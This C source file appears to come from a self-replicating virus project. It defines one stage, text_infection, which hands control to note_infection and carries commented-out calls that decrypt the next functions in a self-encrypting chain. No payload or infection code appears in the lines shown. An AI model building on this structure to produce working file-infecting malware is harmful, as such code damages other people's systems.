#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

#if DEBUG
	MID_TRACER("text_infection:\t\t");
#endif

	if (context == FAILURE)
		goto label;

label:
//	update_keychain_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
//	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	note_infection(host, keychain, context);
}
